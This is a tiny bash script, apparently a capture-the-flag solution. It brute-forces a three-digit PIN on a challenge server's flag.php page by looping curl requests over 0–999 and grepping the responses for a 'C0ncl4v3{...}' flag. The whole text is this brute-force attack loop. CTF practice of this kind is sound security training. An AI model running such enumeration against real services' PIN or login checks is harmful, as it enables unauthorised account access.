#!/bin/bash

for num in {0..999}; do
    curl -s "http://conclave.thehackerconclave.es:42127/flag.php?pin=$num" | grep -o "C0ncl4v3{.*}";
done;
